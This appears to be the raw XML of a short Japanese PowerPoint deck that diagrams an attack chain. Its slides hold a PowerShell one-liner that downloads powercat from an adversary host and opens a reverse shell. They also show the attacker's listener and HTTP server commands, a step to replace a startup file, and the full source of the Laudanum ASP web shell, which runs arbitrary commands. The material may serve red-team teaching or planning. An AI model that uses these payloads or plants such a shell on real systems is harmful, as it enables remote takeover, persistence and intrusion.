        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9751320" y="3713400"/>
            <a:ext cx="353880" cy="12960"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50101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53" name="テキスト ボックス 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10028880" y="3508200"/>
            <a:ext cx="7999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Dowmload</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="800"/>
            </a:b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 powercat.git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テキスト ボックス 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7966800" y="1088640"/>
            <a:ext cx="4188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Powershell –c “IEX(New-Object System.Net.WebClient).DownloadString</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="800"/>
            </a:b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(‘http://AdversaryIP:8080/powercat.ps1’); powercat –c AdversaryIP –p 1234 –e cmd”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コネクタ: 曲線 28"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10796760" y="3677400"/>
            <a:ext cx="244080" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector2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56" name="テキスト ボックス 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10966320" y="3550320"/>
            <a:ext cx="15645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Python3 –m http/server 8080</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="800"/>
            </a:b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nc –lvp 1234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テキスト ボックス 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1620000" y="3240000"/>
            <a:ext cx="20106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Replace start up file</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="800"/>
            </a:b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(powercat.ps1)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ja-JP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細部どのように配置するか</a:t>
            </a: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BAT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" sz="800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="游ゴシック"/>
              </a:rPr>
              <a:t>使うのか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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="180000" y="360000"/>
            <a:ext cx="12104280" cy="651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&lt;%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Server.ScriptTimeout = 180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ip=request.ServerVariables("REMOTE_ADDR")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ip&lt;&gt;"1.2.3.4" then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response.Status="404 Page Not Found"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response.Write(response.Status)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response.End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if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Request.Form("submit") &lt;&gt; "" then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Dim wshell, intReturn, strPResult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cmd = Request.Form("cmd")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Response.Write ("Running command: " &amp; cmd &amp; "&lt;br /&gt;")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set wshell = CreateObject("WScript.Shell")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Set objCmd = wShell.Exec(cmd)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strPResult = objCmd.StdOut.Readall()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response.write "&lt;br&gt;&lt;pre&gt;" &amp; replace(replace(strPResult,"&lt;","&amp;lt;"),vbCrLf,"&lt;br&gt;") &amp; "&lt;/pre&gt;"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set wshell = nothing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if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%&gt;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&lt;html&gt;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&lt;head&gt;&lt;title&gt;Laundanum ASP Shell&lt;/title&gt;&lt;/head&gt;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&lt;body onload="document.shell.cmd.focus()"&gt;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&lt;form action="shell.asp" method="POST" name="shell"&gt;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Command: &lt;Input width="200" type="text" name="cmd" value="&lt;%=cmd%&gt;" /&gt;&lt;br /&gt;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&lt;input type="submit" name="submit" value="Submit" /&gt;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&lt;p&gt;Don't forget that if you want to shell command (not a specific executable) you need to call cmd.exe. It is usually located at C:\Windows\System32\cmd.exe, but to be safe just call %ComSpec%. Also, don't forget to use the /c switch so cmd.exe terminates when your command is done.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&lt;p&gt;Example command to do a directory listing:&lt;br&gt;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%ComSpec% /c dir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&lt;/form&gt;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&lt;hr/&gt;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&lt;address&gt;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Copyright &amp;copy; 2012, &lt;a href="mailto:laudanum@secureideas.net"&gt;Kevin Johnson&lt;/a&gt; and the Laudanum team.&lt;br/&gt;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Written by Tim Medin.&lt;br/&gt;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the latest version at &lt;a href="http://laudanum.secureideas.net"&gt;laudanum.secureideas.net&lt;/a&gt;.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&lt;/address&gt;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&lt;/body&gt;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&lt;/html&gt;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 pitchFamily="0" charset="1"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="游ゴシック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1922</TotalTime>
  <Application>LibreOffice/25.8.6.2$Windows_X86_64 LibreOffice_project/b4b39682cd9868fa725bc664aff94278d315bd04</Application>
  <AppVersion>15.0000</AppVersion>
  <Words>717</Words>
  <Paragraphs>129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2026-04-01T06:29:51Z</dcterms:created>
  <dc:creator>A1259089</dc:creator>
  <dc:description/>
  <dc:language>ja-JP</dc:language>
  <cp:lastModifiedBy/>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-08T18:47:27Z</dcterms:modified>
  <cp:revision>31</cp:revision>
  <dc:subject/>
  <dc:title>PowerPoint プレゼンテーション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ワイド画面</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="Slides">
    <vt:i4>3</vt:i4>
  </property>
</Properties>
</file>